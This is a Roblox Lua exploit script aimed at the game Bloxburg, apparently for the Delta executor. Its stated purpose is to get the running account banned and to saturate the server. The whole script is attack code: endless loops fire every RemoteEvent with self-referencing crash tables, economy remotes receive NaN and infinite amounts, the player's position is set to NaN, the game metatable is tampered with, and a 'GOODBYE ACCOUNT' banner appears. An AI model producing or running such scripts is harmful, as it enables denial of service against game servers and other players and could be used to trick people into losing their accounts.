-- [[ BLOXBURG TOTAL TERMINATION SUITE ]]
-- VERSION: FINAL COMBINED (MAXIMUM DETECTION)
-- PURPOSE: 100% ACCOUNT BAN & SERVER SATURATION

print("Delta: Initiating Full-Spectrum System Meltdown...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local NetworkSettings = settings().Network
local LP = Players.LocalPlayer

-- 1. ENGINE-LEVEL LAG (SYNC-LOCK)
-- Forces the client into a state that is impossible for normal gameplay.
NetworkSettings.IncomingReplicationLag = 999999

-- 2. ECONOMY & DATA CORRUPTION (THE "BAN" TRIGGER)
-- Firing remotes with 'NaN' (0/0) or Infinity to break server math.
task.spawn(function()
    local Events = ReplicatedStorage:WaitForChild("Events", 5)
    while true do
        if Events then
            pcall(function()
                -- Sending illegal values to the bank and job systems
                Events:FireServer("DonateMoney", {["Recipient"] = LP, ["Amount"] = 0/0})
                Events:FireServer("JobAction", {["Type"] = "Complete", ["Amount"] = math.huge})
                Events:FireServer("PurchaseItem", {["Item"] = "HouseSlot", ["Price"] = -math.huge})
            end)
        end
        task.wait(0.01)
    end
end)

-- 3. THE "HONEYPOT" TSUNAMI
-- Scans and spams every remote, specifically hunting for hidden "Trap" remotes.
task.spawn(function()
    local AllRemotes = {}
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then table.insert(AllRemotes, v) end
    end

    while true do
        for _, remote in pairs(AllRemotes) do
            pcall(function()
                -- Circular Reference Table: Designed to crash the server's data parser
                local CrashTable = {}
                CrashTable[1] = CrashTable 
                
                -- Sending massive amounts of corrupt data
                remote:FireServer(CrashTable, {["Exploit"] = true, ["Payload"] = string.rep("BAN", 500)})
            end)
        end
        RunService.Heartbeat:Wait()
    end
end)

-- 4. PHYSICS BOUNDARY BREACH (GLITCH-STATE)
-- Moving to non-existent coordinates (NaN) to trigger position flags.
task.spawn(function()
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Root = Char:WaitForChild("HumanoidRootPart")
    
    RunService.RenderStepped:Connect(function()
        -- Setting position to 'Not a Number' (Impossible location)
        Root.CFrame = CFrame.new(0/0, 0/0, 0/0)
    end)
end)

-- 5. METATABLE TAMPERING (HYPERION TRIGGER)
-- Direct manipulation of the game's core logic table.
task.spawn(function()
    local mt = getrawmetatable(game)
    if setreadonly then setreadonly(mt, false) end
    local old = mt.__index
    
    mt.__index = newcclosure(function(t, k)
        return old(t, k)
    end)
end)

-- 6. STATUS OVERLAY (Last message before the ban)
local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 0, 60)
f.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 1, 0)
t.Text = "NUCLEAR PROTOCOL ACTIVE - GOODBYE ACCOUNT"
t.TextColor3 = Color3.new(1, 1, 1)
t.Font = Enum.Font.GothamBold
t.TextSize = 25

print("Delta: All flags deployed. Your connection will be terminated shortly.")
